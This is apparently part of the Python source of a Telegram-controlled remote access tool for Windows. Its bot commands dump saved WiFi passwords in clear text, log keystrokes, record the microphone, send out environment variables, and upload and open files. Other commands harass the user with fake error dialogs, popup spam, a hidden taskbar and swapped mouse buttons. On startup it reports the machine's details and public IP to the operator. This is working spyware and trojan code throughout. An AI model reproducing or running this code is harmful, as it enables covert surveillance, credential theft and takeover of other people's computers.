def cmd_wifipasswords(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('netsh wlan show profiles',
            shell=True, capture_output=True, text=True, timeout=15)
        profiles = [line.split(':')[1].strip()
                    for line in r.stdout.split('\n')
                    if 'All User Profile' in line]
        results = []
        for profile in profiles:
            try:
                detail = subprocess.run(
                    f'netsh wlan show profile "{profile}" key=clear',
                    shell=True, capture_output=True, text=True, timeout=10)
                pwd_lines = [l.split(':')[1].strip()
                             for l in detail.stdout.split('\n')
                             if 'Key Content' in l]
                pwd = pwd_lines[0] if pwd_lines else '(no password)'
                results.append(f"🔑 {profile}: {pwd}")
            except:
                results.append(f"🔑 {profile}: (error)")
        send_msg(message.chat.id, f"📡 Saved WiFi Passwords:\n\n" + ("\n".join(results) or "(none)"))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['drives'])
def cmd_drives(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        partitions = psutil.disk_partitions()
        lines = []
        for p in partitions:
            try:
                usage = psutil.disk_usage(p.mountpoint)
                lines.append(
                    f"💾 {p.device} ({p.fstype})\n"
                    f"   Used: {usage.used // (1024**3):.1f} / {usage.total // (1024**3):.1f} GB ({usage.percent}%)")
            except:
                lines.append(f"💾 {p.device} ({p.fstype}) - Not ready")
        send_msg(message.chat.id, f"🗄️ Drives:\n\n" + "\n".join(lines))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['env'])
def cmd_env(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        env_vars = []
        for key, value in sorted(os.environ.items()):
            env_vars.append(f"{key}={value[:100]}")
        send_msg(message.chat.id, f"🔧 Environment Variables:\n\n" + "\n".join(env_vars))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['search'])
def cmd_search(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    query = parse_args(message.text, "search")
    if not query:
        bot.send_message(message.chat.id, "❌ Usage: /search <filename>")
        return
    try:
        bot.send_message(message.chat.id, f"🔍 Searching for '{query}'...")
        results = []
        search_dir = os.getcwd()
        for root, dirs, files in os.walk(search_dir):
            for f in files:
                if query.lower() in f.lower():
                    full = os.path.join(root, f)
                    try:
                        sz = os.path.getsize(full)
                        results.append(f"📄 {full} ({sz:,} B)")
                    except:
                        results.append(f"📄 {full}")
            if len(results) >= 50:
                break
        if results:
            send_msg(message.chat.id, f"🔍 Found {len(results)} files:\n\n" + "\n".join(results))
        else:
            bot.send_message(message.chat.id, f"❌ No files matching '{query}'")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['blocksite'])
def cmd_blocksite(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    site = parse_args(message.text, "blocksite")
    if not site:
        bot.send_message(message.chat.id, "❌ Usage: /blocksite <domain>")
        return
    try:
        hosts = r"C:\Windows\System32\drivers\etc\hosts"
        with open(hosts, 'a') as f:
            f.write(f"\n127.0.0.1 {site}\n127.0.0.1 www.{site}\n")
        bot.send_message(message.chat.id, f"🚫 Blocked: {site}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error (need admin): {e}")

@bot.message_handler(commands=['unblocksite'])
def cmd_unblocksite(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    site = parse_args(message.text, "unblocksite")
    if not site:
        bot.send_message(message.chat.id, "❌ Usage: /unblocksite <domain>")
        return
    try:
        hosts = r"C:\Windows\System32\drivers\etc\hosts"
        with open(hosts, 'r') as f:
            lines = f.readlines()
        with open(hosts, 'w') as f:
            for line in lines:
                if site not in line:
                    f.write(line)
        bot.send_message(message.chat.id, f"✅ Unblocked: {site}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error (need admin): {e}")

@bot.message_handler(commands=['popup'])
def cmd_popup(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = parse_args(message.text, "popup", 2)
    if not args:
        bot.send_message(message.chat.id, "❌ Usage: /popup <count> <text>")
        return
    try:
        count = int(args[0])
        text = args[1]
        count = min(count, 100)
        def spam():
            for _ in range(count):
                ctypes.windll.user32.MessageBoxW(0, text, "Alert", 0x30)
        threading.Thread(target=spam, daemon=True).start()
        bot.send_message(message.chat.id, f"💥 Spawning {count} popups...")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Count must be a number")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['record'])
def cmd_record(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    duration = parse_args(message.text, "record")
    if not duration or not duration.isdigit():
        bot.send_message(message.chat.id, "❌ Usage: /record <seconds>")
        return
    seconds = min(int(duration), 120)
    def do_record():
        try:
            import pyaudio
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS,
                          rate=RATE, input=True, frames_per_buffer=CHUNK)
            bot.send_message(message.chat.id, f"🎙️ Recording {seconds}s...")
            frames = []
            for _ in range(0, int(RATE / CHUNK * seconds)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            sample_width = p.get_sample_size(FORMAT)
            p.terminate()
            audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
            wf = wave.open(audio_path, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(sample_width)
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open(audio_path, 'rb') as f:
                bot.send_audio(message.chat.id, f, caption="🎙️ Recording")
            os.remove(audio_path)
        except ImportError:
            bot.send_message(message.chat.id, "❌ pyaudio not installed")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Record error: {e}")
    threading.Thread(target=do_record, daemon=True).start()

@bot.message_handler(commands=['keylog'])
def cmd_keylog(message):
    global keylog_active, keylog_buffer
    if str(message.from_user.id) != ADMIN_ID:
        return
    if keylog_active:
        bot.send_message(message.chat.id, "⌨️ Keylogger already running. Use /stopkeylog")
        return
    keylog_active = True
    keylog_buffer = []
    def log_keys():
        global keylog_active
        try:
            import keyboard
            def on_key(event):
                if keylog_active:
                    keylog_buffer.append(event.name if len(event.name) > 1 else event.name)
            keyboard.on_press(on_key)
            while keylog_active:
                time.sleep(0.1)
            keyboard.unhook_all()
        except ImportError:
            bot.send_message(message.chat.id, "❌ keyboard module not installed")
            keylog_active = False
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Keylog error: {e}")
            keylog_active = False
    threading.Thread(target=log_keys, daemon=True).start()
    bot.send_message(message.chat.id, "⌨️ Keylogger started. Use /stopkeylog to get log.")

@bot.message_handler(commands=['stopkeylog'])
def cmd_stopkeylog(message):
    global keylog_active, keylog_buffer
    if str(message.from_user.id) != ADMIN_ID:
        return
    if not keylog_active:
        bot.send_message(message.chat.id, "❌ Keylogger not running")
        return
    keylog_active = False
    time.sleep(0.5)
    log_text = ' '.join(keylog_buffer)
    keylog_buffer = []
    if log_text:
        if len(log_text) > 3000:
            buf = io.BytesIO(log_text.encode())
            buf.name = "keylog.txt"
            bot.send_document(message.chat.id, buf, caption="⌨️ Keylog")
        else:
            send_msg(message.chat.id, f"⌨️ Keylog:\n\n{log_text}")
    else:
        bot.send_message(message.chat.id, "⌨️ (no keys captured)")

@bot.message_handler(commands=['whoami'])
def cmd_whoami(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('whoami /all', shell=True, capture_output=True, text=True, timeout=15)
        send_msg(message.chat.id, f"👤 User Info:\n\n{r.stdout.strip()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['installed'])
def cmd_installed(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        bot.send_message(message.chat.id, "📦 Getting installed programs...")
        r = subprocess.run(
            'wmic product get name,version /format:csv',
            shell=True, capture_output=True, text=True, timeout=60)
        lines = [l.strip() for l in r.stdout.strip().split('\n') if l.strip()]
        # Also try reg query for more complete list
        r2 = subprocess.run(
            'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName',
            shell=True, capture_output=True, text=True, timeout=30)
        programs = set()
        for line in r2.stdout.split('\n'):
            if 'DisplayName' in line:
                name = line.split('REG_SZ')[-1].strip()
                if name:
                    programs.add(name)
        output = '\n'.join(sorted(programs)[:100])
        if len(programs) > 100:
            output += f"\n\n... and {len(programs) - 100} more"
        if output:
            send_msg(message.chat.id, f"📦 Installed Programs ({len(programs)}):\n\n{output}")
        else:
            bot.send_message(message.chat.id, "❌ Could not retrieve programs")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('sc query state= all', shell=True,
            capture_output=True, text=True, timeout=20)
        lines = r.stdout.strip().split('\n')
        services = []
        name = status = ''
        for line in lines:
            line = line.strip()
            if line.startswith('SERVICE_NAME'):
                name = line.split(':', 1)[1].strip()
            elif line.startswith('STATE'):
                status = line.split(':', 1)[1].strip()
                if name:
                    emoji = '🟢' if 'RUNNING' in status else '🔴'
                    services.append(f"{emoji} {name}")
                    name = ''
        output = '\n'.join(services[:80])
        if len(services) > 80:
            output += f"\n\n... and {len(services) - 80} more"
        send_msg(message.chat.id, f"⚙️ Services ({len(services)}):\n\n{output}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['ipconfig'])
def cmd_ipconfig(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('ipconfig /all', shell=True,
            capture_output=True, text=True, timeout=15)
        send_msg(message.chat.id, f"🌐 Network Config:\n\n{r.stdout.strip()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['netstat'])
def cmd_netstat(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('netstat -an', shell=True,
            capture_output=True, text=True, timeout=15)
        lines = r.stdout.strip().split('\n')
        output = '\n'.join(lines[:100])
        if len(lines) > 100:
            output += f"\n\n... and {len(lines) - 100} more"
        send_msg(message.chat.id, f"🔌 Network Connections:\n\n{output}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['copy'])
def cmd_copy(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = parse_args(message.text, "copy", 2)
    if not args:
        bot.send_message(message.chat.id, "❌ Usage: /copy <source> <destination>")
        return
    src, dst = args[0], args[1]
    if not os.path.isabs(src): src = os.path.join(os.getcwd(), src)
    if not os.path.isabs(dst): dst = os.path.join(os.getcwd(), dst)
    try:
        if os.path.isdir(src):
            shutil.copytree(src, dst)
        else:
            shutil.copy2(src, dst)
        bot.send_message(message.chat.id, f"✅ Copied:\n{src} → {dst}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['move'])
def cmd_move(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = parse_args(message.text, "move", 2)
    if not args:
        bot.send_message(message.chat.id, "❌ Usage: /move <source> <destination>")
        return
    src, dst = args[0], args[1]
    if not os.path.isabs(src): src = os.path.join(os.getcwd(), src)
    if not os.path.isabs(dst): dst = os.path.join(os.getcwd(), dst)
    try:
        shutil.move(src, dst)
        bot.send_message(message.chat.id, f"✅ Moved:\n{src} → {dst}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['rename'])
def cmd_rename(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = parse_args(message.text, "rename", 2)
    if not args:
        bot.send_message(message.chat.id, "❌ Usage: /rename <oldname> <newname>")
        return
    old, new = args[0], args[1]
    if not os.path.isabs(old): old = os.path.join(os.getcwd(), old)
    if not os.path.isabs(new): new = os.path.join(os.getcwd(), new)
    try:
        os.rename(old, new)
        bot.send_message(message.chat.id, f"✅ Renamed:\n{old} → {new}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['mkdir'])
def cmd_mkdir(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    path = parse_args(message.text, "mkdir")
    if not path:
        bot.send_message(message.chat.id, "❌ Usage: /mkdir <path>")
        return
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    try:
        os.makedirs(path, exist_ok=True)
        bot.send_message(message.chat.id, f"📁 Created: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['openfile'])
def cmd_openfile(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    path = parse_args(message.text, "openfile")
    if not path:
        bot.send_message(message.chat.id, "❌ Usage: /openfile <filepath>")
        return
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    try:
        os.startfile(path)
        bot.send_message(message.chat.id, f"📂 Opened: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['setclipboard'])
def cmd_setclipboard(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    text = parse_args(message.text, "setclipboard")
    if not text:
        bot.send_message(message.chat.id, "❌ Usage: /setclipboard <text>")
        return
    try:
        pyperclip.copy(text)
        bot.send_message(message.chat.id, f"📋 Clipboard set: {text[:100]}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['monitors_off'])
def cmd_monitors_off(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        # Send WM_SYSCOMMAND SC_MONITORPOWER 2 = OFF
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        bot.send_message(message.chat.id, "🖥️ Monitors turned off")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['fakeerror'])
def cmd_fakeerror(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    text = parse_args(message.text, "fakeerror")
    if not text:
        bot.send_message(message.chat.id, "❌ Usage: /fakeerror <text>")
        return
    def show():
        ctypes.windll.user32.MessageBoxW(0, text, "Windows Error", 0x10)
    threading.Thread(target=show, daemon=True).start()
    bot.send_message(message.chat.id, f"⚠️ Fake error shown: {text}")

@bot.message_handler(commands=['hidetaskbar'])
def cmd_hidetaskbar(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
        bot.send_message(message.chat.id, "✅ Taskbar hidden")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['showtaskbar'])
def cmd_showtaskbar(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 9)  # SW_RESTORE
        bot.send_message(message.chat.id, "✅ Taskbar restored")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['hidedesktop'])
def cmd_hidedesktop(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        # Find Progman then the SHELLDLL_DefView, then the desktop ListView
        progman = ctypes.windll.user32.FindWindowW("Progman", None)
        ctypes.windll.user32.ShowWindow(progman, 0)
        # Also toggle via key combo
        subprocess.run('powershell -c "(New-Object -ComObject Shell.Application).ToggleDesktop()"',
            shell=True, capture_output=True, timeout=5)
        bot.send_message(message.chat.id, "✅ Desktop icons hidden")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['showdesktop'])
def cmd_showdesktop(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        progman = ctypes.windll.user32.FindWindowW("Progman", None)
        ctypes.windll.user32.ShowWindow(progman, 9)
        subprocess.run('powershell -c "(New-Object -ComObject Shell.Application).ToggleDesktop()"',
            shell=True, capture_output=True, timeout=5)
        bot.send_message(message.chat.id, "✅ Desktop icons restored")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['swap_mouse'])
def cmd_swap_mouse(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        ctypes.windll.user32.SwapMouseButton(True)
        bot.send_message(message.chat.id, "🖱️ Mouse buttons swapped")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['unswap_mouse'])
def cmd_unswap_mouse(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        ctypes.windll.user32.SwapMouseButton(False)
        bot.send_message(message.chat.id, "🖱️ Mouse buttons restored")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

# ============================================================
# DOCUMENT HANDLERS (upload, wallpaper, audio)
# ============================================================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    caption = (message.caption or "").strip()

    if caption.startswith("/upload"):
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            save_path = os.path.join(os.getcwd(), message.document.file_name)
            with open(save_path, 'wb') as f:
                f.write(downloaded)
            bot.send_message(message.chat.id, f"✅ Uploaded: {save_path}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")

    elif caption.startswith("/wallpaper"):
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            wall_path = os.path.join(tempfile.gettempdir(), "wallpaper.bmp")
            img = Image.open(io.BytesIO(downloaded))
            img.save(wall_path, "BMP")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_path, 3)
            bot.send_message(message.chat.id, "✅ Wallpaper changed")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")

    elif caption.startswith("/audio"):
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            ext = os.path.splitext(message.document.file_name)[1] or ".mp3"
            audio_path = os.path.join(tempfile.gettempdir(), f"audio{ext}")
            with open(audio_path, 'wb') as f:
                f.write(downloaded)
            os.startfile(audio_path)
            bot.send_message(message.chat.id, f"🔊 Playing: {message.document.file_name}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")

# Also handle photo for wallpaper
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    caption = (message.caption or "").strip()
    if caption.startswith("/wallpaper"):
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded = bot.download_file(file_info.file_path)
            wall_path = os.path.join(tempfile.gettempdir(), "wallpaper.bmp")
            img = Image.open(io.BytesIO(downloaded))
            img.save(wall_path, "BMP")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_path, 3)
            bot.send_message(message.chat.id, "✅ Wallpaper changed")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")

# Also handle audio content type
@bot.message_handler(content_types=['audio'])
def handle_audio(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    caption = (message.caption or "").strip()
    if caption.startswith("/audio") or True:
        try:
            file_info = bot.get_file(message.audio.file_id)
            downloaded = bot.download_file(file_info.file_path)
            fname = message.audio.file_name or "audio.mp3"
            audio_path = os.path.join(tempfile.gettempdir(), fname)
            with open(audio_path, 'wb') as f:
                f.write(downloaded)
            os.startfile(audio_path)
            bot.send_message(message.chat.id, f"🔊 Playing: {fname}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")

# ============================================================
# SYSTEM TRAY ICON
# ============================================================

def create_tray_icon():
    """Create a visible system tray icon."""
    image = Image.new('RGB', (64, 64), color=(0, 120, 212))
    draw = ImageDraw.Draw(image)
    draw.rectangle([8, 8, 56, 56], outline=(255, 255, 255), width=3)
    draw.rectangle([20, 20, 44, 44], fill=(255, 255, 255))

    def on_exit(icon, item):
        icon.stop()
        os._exit(0)

    icon = pystray.Icon(
        "RemoteAdmin",
        image,
        "Remote Admin Tool - Running",
        menu=pystray.Menu(
            pystray.MenuItem("Remote Admin Tool", lambda: None, enabled=False),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Exit", on_exit)
        )
    )
    icon.run()

# ============================================================
# MAIN
# ============================================================

def notify_admin():
    """Send startup notification with retry (handles post-reboot/shutdown delay)."""
    max_retries = 12  # retry for ~2 minutes if network isn't up yet
    for attempt in range(max_retries):
        try:
            time.sleep(5 if attempt == 0 else 10)

            boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - boot_time
            uptime_secs = uptime.total_seconds()
            hrs = int(uptime_secs // 3600)
            mins = int((uptime_secs % 3600) // 60)

            # If machine booted less than 5 minutes ago → it was restarted or turned on
            if uptime_secs < 300:
                status = "🔄 Machine Back Online"
            else:
                status = "🟢 Client Started"

            try:
                pub_ip = requests.get("https://api.ipify.org", timeout=5).text
            except:
                pub_ip = "N/A"

            msg = (f"{status}\n"
                   f"🏷️ {DEVICE_TAG}\n"
                   f"🆔 Device ID: {DEVICE_ID}\n\n"
                   f"{get_system_info()}\n"
                   f"🌍 Public IP: {pub_ip}\n"
                   f"⏱️ Uptime: {hrs}h {mins}m\n\n"
                   f"Type /help for commands.")

            bot.send_message(ADMIN_ID, msg)
            return  # success, stop retrying
        except:
            if attempt == max_retries - 1:
                pass  # give up silently after all retries

def main():
    # Start tray icon in background
    tray_thread = threading.Thread(target=create_tray_icon, daemon=True)
    tray_thread.start()

    # Notify admin
    notify_thread = threading.Thread(target=notify_admin, daemon=True)
    notify_thread.start()

    # Start polling
    print("Remote Admin Tool running... (visible in system tray)")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
